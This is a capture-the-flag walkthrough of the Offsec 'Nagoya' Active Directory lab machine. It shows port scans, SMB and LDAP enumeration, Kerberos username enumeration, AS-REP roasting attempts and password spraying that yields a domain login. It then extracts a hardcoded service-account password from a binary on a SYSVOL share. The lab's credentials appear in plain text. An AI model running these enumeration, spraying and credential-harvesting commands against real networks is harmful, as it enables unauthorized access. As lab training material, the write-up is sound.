# Offsec Practice: Nagoya CTF Walkthrough

![Leonardo AI](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/leonardoai.jpg)

## Introduction

Nagoya is an Active Directory focused CTF machine that demonstrates common real-world misconfigurations in enterprise Windows environments. The challenge involves thorough enumeration, credential harvesting, SMB share abuse, Kerberos attacks, and Active Directory privilege escalation techniques.

This write-up walks through the full attack path, starting from network enumeration and ending with service account compromise. The focus is on understanding **why** each step was taken, not just the commands used.

## Machine Enumeration

Nmap finds 14 open ports at the initial scan. Most of the ports are Active directory generic ports such as, 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269 and 5985. The port 80 http is open.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ nmap -sC -sV 192.168.204.21 -oN nmap.init.txt                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 11:21 EST
Nmap scan report for 192.168.204.21
Host is up (0.011s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Nagoya Industries - Nagoya
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-03 16:21:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2025-12-02T16:20:46
|_Not valid after:  2026-06-03T16:20:46
|_ssl-date: 2025-12-03T16:22:06+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-03T16:21:26+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-03T16:21:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.43 seconds
```

Scan all ports using Nmap in background and added `nagoya-industries.com` into the `/etc/hosts` file.

```
┌──(kali㉿kali)-[~]
└─$ tail /etc/hosts
192.168.204.21	nagoya-industries.com
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ nmap -p- -T4 192.168.204.21 -oN nmap.all.ports.txt                                               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 11:23 EST
Nmap scan report for 192.168.204.21
Host is up (0.0077s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49681/tcp open  unknown
49691/tcp open  unknown
49698/tcp open  unknown
49717/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 87.49 seconds
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ nmap -p 9389,49666,49668,49676,49677,49681,49691,49698,49717 -sC -sV 192.168.204.21 -oN nmap.detail.tcp.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 11:27 EST
Nmap scan report for nagoya-industries.com (192.168.204.21)
Host is up (0.0084s latency).

PORT      STATE SERVICE    VERSION
9389/tcp  open  mc-nmf     .NET Message Framing
49666/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc      Microsoft Windows RPC
49681/tcp open  msrpc      Microsoft Windows RPC
49691/tcp open  msrpc      Microsoft Windows RPC
49698/tcp open  msrpc      Microsoft Windows RPC
49717/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.46 seconds
```

Port 445 SMB service enumeration using `crackmapexec` and `smbclient` but didn’t open any open shares.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ crackmapexec smb 192.168.204.21 -u '' -p ''     
SMB         192.168.204.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.204.21  445    NAGOYA           [+] nagoya-industries.com\: 
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ crackmapexec smb 192.168.204.21 -u '' -p '' --shares
SMB         192.168.204.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.204.21  445    NAGOYA           [+] nagoya-industries.com\: 
SMB         192.168.204.21  445    NAGOYA           [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ crackmapexec winrm 192.168.204.21 -u '' -p ''
SMB         192.168.204.21  5985   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
HTTP        192.168.204.21  5985   NAGOYA           [*] http://192.168.204.21:5985/wsman
WINRM       192.168.204.21  5985   NAGOYA           [-] nagoya-industries.com\: "SpnegoError (16): Operation not supported or available, Context: Retrieving NTLM store without NTLM_USER_FILE set to a filepath"

┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ smbclient -N -L //192.168.204.21/
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.204.21 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

LDAP service enumeration using `ldapsearch` tool and found a serverice account name `nagoya$`.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ ldapsearch -x -H ldap://192.168.204.21 -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=nagoya-industries,DC=com
ldapServiceName: nagoya-industries.com:nagoya$@NAGOYA-INDUSTRIES.COM
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=nagoya-industrie
 s,DC=com
serverName: CN=NAGOYA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Config
 uration,DC=nagoya-industries,DC=com
schemaNamingContext: CN=Schema,CN=Configuration,DC=nagoya-industries,DC=com
namingContexts: DC=nagoya-industries,DC=com
namingContexts: CN=Configuration,DC=nagoya-industries,DC=com
namingContexts: CN=Schema,CN=Configuration,DC=nagoya-industries,DC=com
namingContexts: DC=DomainDnsZones,DC=nagoya-industries,DC=com
namingContexts: DC=ForestDnsZones,DC=nagoya-industries,DC=com
isSynchronized: TRUE
highestCommittedUSN: 28731
dsServiceName: CN=NTDS Settings,CN=NAGOYA,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=nagoya-industries,DC=com
dnsHostName: nagoya.nagoya-industries.com
defaultNamingContext: DC=nagoya-industries,DC=com
currentTime: 20251203163441.0Z
configurationNamingContext: CN=Configuration,DC=nagoya-industries,DC=com

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ ldapsearch -x -H ldap://192.168.204.21 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=nagoya-industries,DC=com
namingcontexts: CN=Configuration,DC=nagoya-industries,DC=com
namingcontexts: CN=Schema,CN=Configuration,DC=nagoya-industries,DC=com
namingcontexts: DC=DomainDnsZones,DC=nagoya-industries,DC=com
namingcontexts: DC=ForestDnsZones,DC=nagoya-industries,DC=com

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ ldapsearch -x -H ldap://192.168.204.21 -b 'DC=nagoya-industries,DC=com' -s sub
# extended LDIF
#
# LDAPv3
# base <DC=nagoya-industries,DC=com> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5E, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

Tried AS-REP Roasting but didn’t get any hash.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ impacket-GetNPUsers -dc-ip 192.168.204.21 -request -outputfile hashes.domain.txt nagoya-industries.com/nagoya$
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Cannot authenticate nagoya$, getting its TGT
[-] User nagoya$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Port 80 http service enumeration by visiting web application through browser and put `ffuf` tool in background for directory and page discovery.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ ffuf -u 'http://nagoya-industries.com/FUZZ' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 120 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nagoya-industries.com/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 120
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 3530, Words: 831, Lines: 79, Duration: 21ms]
Index                   [Status: 200, Size: 3530, Words: 831, Lines: 79, Duration: 21ms]
team                    [Status: 200, Size: 6896, Words: 3634, Lines: 180, Duration: 25ms]
error                   [Status: 200, Size: 3128, Words: 652, Lines: 69, Duration: 19ms]
INDEX                   [Status: 200, Size: 3530, Words: 831, Lines: 79, Duration: 22ms]
Team                    [Status: 200, Size: 6896, Words: 3634, Lines: 180, Duration: 24ms]
Error                   [Status: 200, Size: 3128, Words: 652, Lines: 69, Duration: 10ms]
                        [Status: 200, Size: 3530, Words: 831, Lines: 79, Duration: 21ms]
:: Progress: [220546/220546] :: Job [1/1] :: 10000 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

At the landing page gives team members name. Made a username list and test ran `kerbrute_linux_amd64` tool to find valid usernames.

- usernames.txt
    
    ```
    ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
    └─$ cat foundusers.txt                                                             
    nagoya$
    Matthew
    Emma
    Rebecca
    Scott
    Terry
    Holly
    Anne
    Brett
    Melissa
    Craig
    Fiona
    Patrick
    Kate
    Kirsty
    Andrea
    Abigail
    Melanie
    Frances
    Sylvia
    Wayne
    Iain
    Joanna
    Bethan
    Elaine
    Christopher
    Megan
    Damien
    Joanne
    Harrison
    Miah
    Bell
    Gardner
    Edwards
    Matthews
    Jenkins
    Naylor
    Mitchell
    Carr
    Clark
    Martin
    Watson
    Norris
    Hayes
    Hughes
    Watson
    Ward
    King
    Hartley
    White
    Wood
    Webster
    Brady
    Lewis
    Johnson
    Chapman
    Lewis
    Matthew.Harrison
    Emma.Miah
    Rebecca.Bell
    Scott.Gardner
    Terry.Edwards
    Holly.Matthews
    Anne.Jenkins
    Brett.Naylor
    Melissa.Mitchell
    Craig.Carr
    Fiona.Clark
    Patrick.Martin
    Kate.Watson
    Kirsty.Norris
    Andrea.Hayes
    Abigail.Hughes
    Melanie.Watson
    Frances.Ward
    Sylvia.King
    Wayne.Hartley
    Iain.White
    Joanna.Wood
    Bethan.Webster
    Elaine.Brady
    Christopher.Lewis
    Megan.Johnson
    Damien.Chapman
    Joanne.Lewis
    ```
    

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ ~/tools/windows/kerbrute/kerbrute_linux_amd64 userenum --dc 192.168.204.21 -d 'nagoya-industries.com' -o foundusers.txt usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/03/25 - Ronnie Flathers @ropnop

2025/12/03 12:19:12 >  Using KDC(s):
2025/12/03 12:19:12 >  	192.168.204.21:88

2025/12/03 12:19:12 >  [+] VALID USERNAME:	 nagoya$@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Emma.Miah@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Matthew.Harrison@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Rebecca.Bell@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Terry.Edwards@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Holly.Matthews@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Scott.Gardner@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Anne.Jenkins@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Brett.Naylor@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Craig.Carr@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Melissa.Mitchell@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Patrick.Martin@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Fiona.Clark@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Abigail.Hughes@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Kirsty.Norris@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Kate.Watson@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Melanie.Watson@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Frances.Ward@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Andrea.Hayes@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Sylvia.King@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Wayne.Hartley@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Joanna.Wood@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Iain.White@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Bethan.Webster@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Elaine.Brady@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Christopher.Lewis@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Damien.Chapman@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Megan.Johnson@nagoya-industries.com
2025/12/03 12:19:12 >  [+] VALID USERNAME:	 Joanne.Lewis@nagoya-industries.com
2025/12/03 12:19:12 >  Done! Tested 85 usernames (29 valid) in 0.095 seconds
```

Once the valid usernames found then swap the files from foundusers.txt to usernames.txt.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image.png)

Test `AS-REP` roasting using valid usernames but didn’t find any hash. 

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ impacket-GetNPUsers nagoya-industries.com/ -usersfile usernames.txt -format hashcat -outputfile hashes.domain.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User nagoya$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Emma.Miah doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Matthew.Harrison doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Rebecca.Bell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Terry.Edwards doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Gardner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Anne.Jenkins doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Holly.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brett.Naylor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Craig.Carr doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Melissa.Mitchell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Patrick.Martin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Fiona.Clark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Abigail.Hughes doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kirsty.Norris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kate.Watson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Melanie.Watson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Frances.Ward doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Andrea.Hayes doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Sylvia.King doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Wayne.Hartley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Joanna.Wood doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Iain.White doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Bethan.Webster doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Elaine.Brady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Christopher.Lewis doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Damien.Chapman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Megan.Johnson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Joanne.Lewis doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The `ffuf` tool found an interesting `Error` page which reveal information about web application program language environment which is `ASP`

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image1.png)

Nothing leads to further. From here web application’s home page gives an idea about possible password can we guess it through company’s information.

Create a password list from below screenshot.

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image2.png)

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image3.png)

- passwordslist.txt
    
    ```
    ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
    └─$ cat passwordlist.txt                                                
    spring2023
    2023spring
    autumn2023
    2023autumn
    Spring2023
    2023Spring
    Autumn2023
    2023Autumn
    ```
    

Brute-force username and password using `crackmapexec` against SMB service and found a valid credential `carig.carr:Spring2023`.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
└─$ crackmapexec smb 192.168.204.21 -u usernames.txt -p passwordlist.txt
SMB         192.168.204.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.204.21  445    NAGOYA           [-] nagoya-industries.com\nagoya$:spring2023 STATUS_LOGON_FAILURE 
...
...
...
SMB         192.168.204.21  445    NAGOYA           [+] nagoya-industries.com\Craig.Carr:Spring2023
```

Useing smbclient tool and `carig.carr:Spring2023` credential found an interesting application which contain password of the service account: `svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg`.

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya/port445smb]
└─$ smbclient \\\\192.168.204.21\\SYSVOL -U 'craig.carr'
Password for [WORKGROUP\craig.carr]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 30 02:31:25 2023
  ..                                  D        0  Sun Apr 30 02:31:25 2023
  nagoya-industries.com              Dr        0  Sun Apr 30 02:31:25 2023

		10328063 blocks of size 4096. 4813712 blocks available
smb: \> cd "nagoya-industries.com"
smb: \nagoya-industries.com\> dir
  .                                   D        0  Sun Apr 30 02:37:44 2023
  ..                                  D        0  Sun Apr 30 02:37:44 2023
  DfsrPrivate                      DHSr        0  Sun Apr 30 02:37:44 2023
  Policies                            D        0  Sun Apr 30 02:31:32 2023
  scripts                             D        0  Sun Apr 30 04:07:13 2023

		10328063 blocks of size 4096. 4813712 blocks available
smb: \nagoya-industries.com\> cd scripts
smb: \nagoya-industries.com\scripts\> dir
  .                                   D        0  Sun Apr 30 04:07:13 2023
  ..                                  D        0  Sun Apr 30 04:07:13 2023
  ResetPassword                       D        0  Sun Apr 30 04:07:07 2023

		10328063 blocks of size 4096. 4813712 blocks available
smb: \nagoya-industries.com\scripts\> cd ResetPassword
smb: \nagoya-industries.com\scripts\ResetPassword\> dir
  .                                   D        0  Sun Apr 30 04:07:07 2023
  ..                                  D        0  Sun Apr 30 04:07:07 2023
  ResetPassword.exe                   A     5120  Sun Apr 30 13:04:02 2023
  ResetPassword.exe.config            A      189  Sun Apr 30 12:53:50 2023
  System.IO.FileSystem.AccessControl.dll      A    28552  Mon Oct 19 23:39:30 2020
  System.IO.FileSystem.AccessControl.xml      A    65116  Sat Oct 10 01:10:54 2020
  System.Security.AccessControl.dll      A    35952  Sat Oct 23 04:45:08 2021
  System.Security.AccessControl.xml      A   231631  Tue Oct 19 12:14:20 2021
  System.Security.Permissions.dll      A    30328  Tue Oct 18 21:34:02 2022
  System.Security.Permissions.xml      A     8987  Tue Oct 18 21:34:02 2022
  System.Security.Principal.Windows.dll      A    18312  Mon Oct 19 23:46:28 2020
  System.Security.Principal.Windows.xml      A    90968  Sat Oct 10 01:10:54 2020

		10328063 blocks of size 4096. 4813712 blocks available
smb: \nagoya-industries.com\scripts\ResetPassword\> mget *
Get file ResetPassword.exe? y
getting file \nagoya-industries.com\scripts\ResetPassword\ResetPassword.exe of size 5120 as ResetPassword.exe (125.0 KiloBytes/sec) (average 125.0 KiloBytes/sec)
Get file ResetPassword.exe.config? y
getting file \nagoya-industries.com\scripts\ResetPassword\ResetPassword.exe.config of size 189 as ResetPassword.exe.config (5.6 KiloBytes/sec) (average 71.0 KiloBytes/sec)
Get file System.IO.FileSystem.AccessControl.dll? y
getting file \nagoya-industries.com\scripts\ResetPassword\System.IO.FileSystem.AccessControl.dll of size 28552 as System.IO.FileSystem.AccessControl.dll (697.1 KiloBytes/sec) (average 292.6 KiloBytes/sec)
Get file System.IO.FileSystem.AccessControl.xml? y
getting file \nagoya-industries.com\scripts\ResetPassword\System.IO.FileSystem.AccessControl.xml of size 65116 as System.IO.FileSystem.AccessControl.xml (1718.6 KiloBytes/sec) (average 644.4 KiloBytes/sec)
Get file System.Security.AccessControl.dll? y
getting file \nagoya-industries.com\scripts\ResetPassword\System.Security.AccessControl.dll of size 35952 as System.Security.AccessControl.dll (235.6 KiloBytes/sec) (average 440.7 KiloBytes/sec)
Get file System.Security.AccessControl.xml? y
ygetting file \nagoya-industries.com\scripts\ResetPassword\System.Security.AccessControl.xml of size 231631 as System.Security.AccessControl.xml (539.9 KiloBytes/sec) (average 498.6 KiloBytes/sec)
Get file System.Security.Permissions.dll? y
getting file \nagoya-industries.com\scripts\ResetPassword\System.Security.Permissions.dll of size 30328 as System.Security.Permissions.dll (231.4 KiloBytes/sec) (average 458.1 KiloBytes/sec)
Get file System.Security.Permissions.xml? y
getting file \nagoya-industries.com\scripts\ResetPassword\System.Security.Permissions.xml of size 8987 as System.Security.Permissions.xml (105.7 KiloBytes/sec) (average 426.7 KiloBytes/sec)
Get file System.Security.Principal.Windows.dll? y
getting file \nagoya-industries.com\scripts\ResetPassword\System.Security.Principal.Windows.dll of size 18312 as System.Security.Principal.Windows.dll (150.3 KiloBytes/sec) (average 395.3 KiloBytes/sec)
Get file System.Security.Principal.Windows.xml? y
getting file \nagoya-industries.com\scripts\ResetPassword\System.Security.Principal.Windows.xml of size 90968 as System.Security.Principal.Windows.xml (304.2 KiloBytes/sec) (average 375.4 KiloBytes/sec)
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Nagoya/port445smb]
└─$ strings -e l ResetPassword.exe
Usage: PasswordReset.exe <Domain Username> <New Password>
nagoya-industries.com
User not found.
Password reset successful.
svc_helpdesk
U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
VS_VERSION_INFO
VarFileInfo
Translation
StringFileInfo
000004b0
Comments
CompanyName
FileDescription
ResetPassword
FileVersion
1.0.0.0
InternalName
ResetPassword.exe
LegalCopyright
Copyright 
  2023
LegalTrademarks
